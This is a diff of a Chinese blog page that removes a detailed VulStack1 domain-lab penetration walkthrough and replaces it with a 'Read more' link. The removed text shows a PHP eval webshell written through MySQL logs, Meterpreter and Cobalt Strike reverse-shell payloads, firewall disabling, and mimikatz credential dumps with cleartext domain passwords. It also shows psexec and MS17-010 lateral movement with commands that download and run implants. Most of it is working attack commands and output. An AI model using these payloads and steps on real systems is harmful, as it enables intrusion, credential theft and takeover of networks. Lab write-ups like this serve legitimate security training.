@@ -194,7 +194,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-01-11 11:33:17" itemprop="dateModified" datetime="2024-01-11T11:33:17+08:00">2024-01-11</time>
+      <time title="Modified: 2024-01-11 11:43:43" itemprop="dateModified" datetime="2024-01-11T11:43:43+08:00">2024-01-11</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -219,142 +219,14 @@
           <p>本文内容纯属虚构！</p>
 <h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>靶机地址：<br>Win03 32位 192.168.52.141<br>Win08 64位 192.168.52.138<br>Win7   32位 192.168.52.143 + 192.168.0.15</p>
 <p>测试机：<br>192.168.0.16 win<br>192.168.0.17 linux</p>
-<h3 id="外网信息收集"><a href="#外网信息收集" class="headerlink" title="外网信息收集"></a>外网信息收集</h3><p>192.168.0.15</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON          VERSION</span><br><span class="line">80/tcp   open  http    syn-ack ttl 128 Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</span><br><span class="line">|_http-title: phpStudy 2014 </span><br><span class="line">3306/tcp open  mysql   syn-ack ttl 128 MySQL (unauthorized)</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h 192.168.0.15 -u root</span><br><span class="line">ERROR 1130 (HY000): Host &#x27;192.168.0.16&#x27; is not allowed to connect to this MySQL server</span><br></pre></td></tr></table></figure>
-
-
-
-<p>Win7靶机：<br>Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2j PHP&#x2F;5.4.45<br>Web路径：C:&#x2F;phpStudy&#x2F;WWW<br>Windows NT STU1 6.1 build 7601 (Windows 7 Business Edition Service Pack 1) i586<br>服务器主机名：STU1<br>测试数据库：输入root&#x2F;root显示数据库连接正常</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.0.15/FUZZ -e .php,.txt,.html -c -ic</span><br><span class="line">/L.php</span><br><span class="line">http://192.168.0.15/phpinfo.php</span><br><span class="line">/phpMyAdmin 302</span><br></pre></td></tr></table></figure>
-
-
-
-<p>fuzz目录<br>&#x2F;usr&#x2F;local&#x2F;share&#x2F;dicts&#x2F;fuzzDicts_TheKingOfDuck&#x2F;directoryDicts&#x2F;top7000.txt<br>&#x2F;<br>御剑默认字典<br>得到<br>&#x2F;beifen.rar<br>在\protected\config.php中找到phpmyadmin的用户名和密码</p>
-<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><h5 id="phpMyAdmin"><a href="#phpMyAdmin" class="headerlink" title="phpMyAdmin"></a>phpMyAdmin</h5><p><a target="_blank" rel="noopener" href="http://192.168.0.15/phpMyAdmin/">http://192.168.0.15/phpMyAdmin/</a><br>root&#x2F;root登录成功<br>select * from mysql.user仅有root用户<br>发现newyxcms数据库<br>yx_admin表中：admin&#x2F;168a73655bfecefdb15b14984dd2ad60</p>
-<p>可猜测网站根目录：&#x2F;yxcms</p>
-<p>修改模板后，根据之前下载的备份文件内容，查找出文件路径</p>
-<p>cms<br>爆破出admin，密码为123456</p>
-<p>前台模版并在index_index.php插入木马</p>
-<h5 id="MySQL通过日志getshell"><a href="#MySQL通过日志getshell" class="headerlink" title="MySQL通过日志getshell"></a>MySQL通过日志getshell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;%general%&#x27;</span><br><span class="line">SET GLOBAL general_log = ON</span><br><span class="line">set global general_log_file = &quot;C:\\phpStudy\\WWW\\haha.php&quot;;</span><br><span class="line">SHOW VARIABLES LIKE &#x27;%general%&#x27;</span><br><span class="line">select &quot;&lt;?php @eval($_POST[a]);?&gt;&quot;;</span><br><span class="line">SET GLOBAL general_log = OFF</span><br><span class="line"></span><br><span class="line">POST /haha.php HTTP/1.1</span><br><span class="line">a=phpinfo();</span><br></pre></td></tr></table></figure>
-
-<p>蚁剑连接<a target="_blank" rel="noopener" href="http://192.168.0.15/haha.php">http://192.168.0.15/haha.php</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\WWW&gt; whoami</span><br><span class="line">god\administrator</span><br></pre></td></tr></table></figure>
-
-<h5 id="慢查询日志getshell"><a href="#慢查询日志getshell" class="headerlink" title="慢查询日志getshell"></a>慢查询日志getshell</h5><p>如果查询时间超过了这个时间值(默认为10秒),这个查询语句将被记录到慢查询日志中，查看默认时间值long_query_time</p>
-<p>show global variables like ‘%long%’;</p>
-<p>查看慢查询日志是否开启slow_query_log和日志文件位置slow_query_log_file</p>
-<p>show global variables like ‘%slow%’</p>
-<p>开启1关闭0</p>
-<p>set global slow_query_log&#x3D;1;</p>
-<p>修改日志文件的绝对路径和文件名</p>
-<p>set global slow_query_log_file&#x3D;”C:\phpstudy\WWW\shell.php”;</p>
-<p>对日志写入内容</p>
-<p>select ‘<?php phpinfo();?>‘ or sleep(11);</p>
-<h3 id="外网服务器信息收集"><a href="#外网服务器信息收集" class="headerlink" title="外网服务器信息收集"></a>外网服务器信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\WWW&gt; net user /domain</span><br><span class="line">这项请求将在域 god.org 的域控制器处理。</span><br><span class="line">\\owa.god.org 的用户帐户</span><br><span class="line">\--------------------------------------------------------------------------</span><br><span class="line">Administrator       Guest        krbtgt       ligang       liukaifeng01</span><br><span class="line"></span><br><span class="line">C:\phpStudy\WWW&gt; net group &quot;domain admins&quot; /domain</span><br><span class="line">Administrator            OWA$</span><br><span class="line"></span><br><span class="line">C:\phpStudy\WWW&gt; netsh firewall set opmode disable</span><br></pre></td></tr></table></figure>
-
-<p>上传3389bat</p>
-<p>C:\Users&gt; 3389.bat</p>
-<p>远程连接后，powershell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(</span><br><span class="line">Forest                  : god.org</span><br><span class="line">DomainControllers       : &#123;owa.god.org&#125;</span><br><span class="line">Children                : &#123;&#125;</span><br><span class="line">DomainMode              : Windows2003Domain</span><br><span class="line">Parent                  :</span><br><span class="line">**PdcRoleOwner            : owa.god.org**</span><br><span class="line">RidRoleOwner            : owa.god.org</span><br><span class="line">InfrastructureRoleOwner : owa.god.org</span><br><span class="line">**Name                    : god.org</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\WWW&gt; systeminfo</span><br><span class="line">主机名:           STU1</span><br><span class="line">OS 名称:          Microsoft Windows 7 专业版 </span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">系统类型:         x64-based PC</span><br></pre></td></tr></table></figure>
-
-<h3 id="上线C2"><a href="#上线C2" class="headerlink" title="上线C2"></a>上线C2</h3><h5 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h5><p>生成payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use payload/windows/x64/meterpreter/reverse_tcp</span><br><span class="line">options</span><br><span class="line">set LHOST 192.168.0.17</span><br><span class="line">set LPORT 5555</span><br><span class="line">generate -f exe -o reverse.exe</span><br><span class="line">ls -alh</span><br></pre></td></tr></table></figure>
-
-
-
-<p>通过Webshell上传至</p>
-<p>C:\Users\Administrator\Downloads\</p>
-<p>MSF开启监听</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">options</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 0.0.0.0</span><br><span class="line">set LPORT 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-
-
-<p>通过Webshell执行exe</p>
-<p>C:\Users\Administrator\Downloads&gt; .\reverse.exe</p>
-<h5 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h5><p>创建监听</p>
-<p>windows&#x2F;beacon_http&#x2F;reverse_http</p>
-<p>192.168.0.16</p>
-<p>6555</p>
-<p>生成后门–windows exe–勾上x64</p>
-<p>artifact.exe上传到服务器</p>
-<p>beacon&gt; shell whoami</p>
-<p>god\administrator</p>
-<h3 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h3><p>查看域内信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\Users\Administrator\Downloads&gt;chcp 65001</span><br><span class="line">chcp 65001</span><br><span class="line">Active code page: 65001</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Downloads&gt;net config workstation</span><br><span class="line">net config workstation</span><br><span class="line">Computer name                        \\STU1</span><br><span class="line">Full Computer name                   stu1.god.org</span><br><span class="line">User name                            Administrator</span><br><span class="line"></span><br><span class="line">Workstation active on</span><br><span class="line">        NetBT_Tcpip_&#123;C85B40A8-4C87-4613-8092-0C1B165E8B30&#125; (000C295E2DAF)</span><br><span class="line">        NetBT_Tcpip_&#123;4DAEBDFD-0177-4691-8243-B73297E2F0FF&#125; (000C295E2DA5)</span><br><span class="line">        NetBT_Tcpip_&#123;EC57C4EB-763E-4000-9CDE-4D7FF15DF74C&#125; (02004C4F4F50)</span><br><span class="line"></span><br><span class="line">Software version                     Windows 7 Professional</span><br><span class="line"></span><br><span class="line">Workstation domain                   GOD</span><br><span class="line">Workstation Domain DNS Name          god.org</span><br><span class="line">Logon domain                         GOD</span><br></pre></td></tr></table></figure>
-
-<p>查看域控IP（时间根据域控的时间更新</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Downloads&gt;net time /domain</span><br><span class="line">Current time at \\owa.god.org is 2023/8/3 17:37:58</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Downloads&gt;ping owa.god.org</span><br><span class="line">Pinging owa.god.org [192.168.52.138] with 32 bytes of data:</span><br><span class="line">Reply from 192.168.52.138: bytes=32 time&lt;1ms TTL=128</span><br></pre></td></tr></table></figure>
-
-<p>域控IP：192.168.52.138</p>
-<p>查看同一域内所有主机名及IP：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Downloads&gt;net view</span><br><span class="line">Server Name       Remark</span><br><span class="line">\\OWA</span><br><span class="line">\\ROOT-TVI862UBEH</span><br><span class="line">\\STU1</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Downloads&gt;ping ROOT-TVI862UBEH</span><br><span class="line">ping ROOT-TVI862UBEH</span><br><span class="line">Pinging ROOT-TVI862UBEH.god.org [192.168.52.141]</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Downloads&gt;ping OWA</span><br><span class="line">ping OWA</span><br><span class="line">Pinging owa.god.org [192.168.52.138]</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Downloads&gt;exit</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
-
-<p>总结出：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.138    \\OWA</span><br><span class="line">192.168.52.141    \\ROOT-TVI862UBEH</span><br><span class="line">192.168.0.15    \\STU1</span><br><span class="line">192.168.52.143</span><br></pre></td></tr></table></figure>
-
-
-
-<p>抓本地密码hash（本地非域内</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
-
-<p>抓hash</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">mimikatz 2.2.0 20191125 (x64/windows)</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[!] Not running as SYSTEM, execution may fail        （权限不够）</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">[-] Error running command creds_all: ActiveRecord::RecordInvalid Validation failed: Data is not in the NTLMHash data format of &lt;LAN Manager hex digest&gt;:&lt;NT LAN Manager hex digest&gt;, where each hex digest is 32 lowercase hexadecimal characters.</span><br></pre></td></tr></table></figure>
-
-<p>抓域内hash</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; creds_kerberos</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving kerberos credentials</span><br><span class="line"></span><br><span class="line"># kerberos credentials</span><br><span class="line"></span><br><span class="line">Username   Domain   Password</span><br><span class="line">------</span><br><span class="line">(null)   (null)   (null)</span><br><span class="line">Administrator  GOD.ORG  Stack@1</span><br><span class="line">stu1$   GOD.ORG  b5 57 c6 8b d1 ... 38 70 73 72 af a2 e9 9b 42 6d a6 1f</span><br></pre></td></tr></table></figure>
-
-<p>CS运行mimikatz</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; logonpasswords</span><br><span class="line">- Username : Administrator</span><br><span class="line">- Domain   : GOD</span><br><span class="line">- Password : Stack@1</span><br></pre></td></tr></table></figure>
-
-<p>查Administrator是否是域管</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\Windows\system32&gt;net group &quot;domain admins&quot; /domain</span><br><span class="line">Administrator            OWA$</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell whoami</span><br><span class="line">god\administrator</span><br><span class="line"></span><br><span class="line">beacon&gt; net view</span><br><span class="line"> OWA           192.168.52.138       500       6.1      PDC</span><br><span class="line"> ROOT-TVI862UBEH         192.168.52.141       500       5.2 </span><br><span class="line"> STU1         192.168.52.143        500       6.1</span><br></pre></td></tr></table></figure>
-
-
-
-<p>0000000000000000000000000000000000000000000000</p>
-<p>192.168.52.138<br>msf6 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set RHOST 192.168.52.138<br>RHOST &#x3D;&gt; 192.168.52.138<br>msf6 exploit(windows&#x2F;smb&#x2F;psexec) &gt; exploit<br>meterpreter &gt; bg<br>[*] Backgrounding session 3…<br>msf6 exploit(windows&#x2F;smb&#x2F;psexec) &gt; sessions<br>1         meterpreter x86&#x2F;windows  GOD\Administrator @ STU1   192.168.0.17:5555 -&gt; 192.168.0.15:1272 (192.168.0.15)<br>3         meterpreter x86&#x2F;windows  NT AUTHORITY\SYSTEM @ OWA  192.168.0.17:4444 -&gt; 192.168.0.5:63290 (192.168.52.138</p>
-<p>000000000000000000000000000000000000000000000000</p>
-<p>上传fscan和hosts.txt和至192.168.0.15</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">hosts.txt:</span><br><span class="line">192.168.52.141</span><br><span class="line">192.168.52.138</span><br><span class="line">192.168.52.143</span><br><span class="line"></span><br><span class="line">shell fscan64.exe -hf hosts.txt</span><br><span class="line">NetInfo:</span><br><span class="line">[*]192.168.52.143</span><br><span class="line">   [-&gt;]stu1</span><br><span class="line">   [-&gt;]192.168.52.143</span><br><span class="line">   [-&gt;]192.168.0.15</span><br><span class="line">   [-&gt;]169.254.129.186</span><br><span class="line">[+] 192.168.52.143	MS17-010	(Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[*] 192.168.52.143       GOD\STU1              Windows 7 Professional 7601 Service Pack 1</span><br><span class="line">NetInfo:</span><br><span class="line">[*]192.168.52.138</span><br><span class="line">   [-&gt;]owa</span><br><span class="line">   [-&gt;]192.168.52.138</span><br><span class="line">NetInfo:</span><br><span class="line">[*]192.168.52.141</span><br><span class="line">   [-&gt;]root-tvi862ubeh</span><br><span class="line">   [-&gt;]192.168.52.141</span><br><span class="line">[*] 192.168.52.141       __MSBROWSE__\SNTL_ROOT-TVI86</span><br><span class="line">[*] WebTitle:http://192.168.52.141:7002 code:200 len:2632   title:Sentinel Keys License Monitor</span><br><span class="line">[+] 192.168.52.141	MS17-010	(Windows Server 2003 3790)</span><br><span class="line">[+] 192.168.52.138	MS17-010	(Windows Server 2008 R2 Datacenter 7601 Service Pack 1)</span><br><span class="line">[*] 192.168.52.138 [+]DC GOD\OWA               Windows Server 2008 R2 Datacenter 7601 Service Pack 1</span><br><span class="line">[*] WebTitle:http://192.168.52.141:8099 code:403 len:1409   title:The page must be viewed over a secure channel</span><br><span class="line">[*] WebTitle:http://192.168.52.138     code:200 len:4      title:IIS7</span><br><span class="line">[+] ftp://192.168.52.141:21:anonymous</span><br></pre></td></tr></table></figure>
-
-<p>CS会话当中设置新的监听器用于上线内网主机<br>右键192.168.0.15–中转（pivoting）–Listener<br>内网代理主机的IP地址设置为192.168.52.143，默认4444端口</p>
-<p>借用该监听器生成相应木马mac2.exe：<br>选择Windows Executable(Stageless)生成Windows exe，64位</p>
-<p>将mac2.exe上传至192.168.0.15的站点目录C:\phpStudy\WWW</p>
-<p>在本地开启MSF并设置代理</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; setg Proxies socks5:192.168.0.17:6000</span><br><span class="line">msf &gt; setg ReverseAllowProxy true</span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">msf &gt; set rhosts 192.168.52.138</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; run</span><br><span class="line">msf &gt; set command &quot;powershell.exe -Command (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.52.143/mac2.exe&#x27;,&#x27;mac2.exe&#x27;);start-process mac2.exe&quot;</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
-
-
-
-<p>域控主机成功上线CS</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* Username : liukaifeng01</span><br><span class="line">* Domain   : GOD</span><br><span class="line">* Password : Stack@2</span><br></pre></td></tr></table></figure>
-
-
-
-<p>在使用MS17-010攻击域内主机Windows Server 2003时CS无法上线（因为无法使用powershell执行命令），同时该操作系统为X86架构，对应需要使用32位的木马。因此需要使用CS生成32位木马mac3.exe</p>
-<p>将mac3.exe上传至目标的站点目录</p>
-<p>重新设置命令使用certutil下载木马set command “certutil.exe -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.52.143/mac3.exe">http://192.168.52.143/mac3.exe</a> mac3.exe”</p>
-<p>但是目标返回报错信息</p>
-<p>使用域管理员通过IPC$进行连接</p>
-<p>shell net use \192.168.52.141\ipc$ “Stack@1” &#x2F;user:Administrator</p>
-<p>shell net use</p>
-<p>将木马复制到域内主机的C盘目录当中</p>
-<p>shell copy mac3.exe \192.168.52.141\c$</p>
-<p>在MSF中通过MS17-010执行木马</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; set command &quot;C:\\mac3.exe&quot;</span><br><span class="line">msf &gt; set rhosts 192.168.52.141</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
-
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/11/16/VulStack1_%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
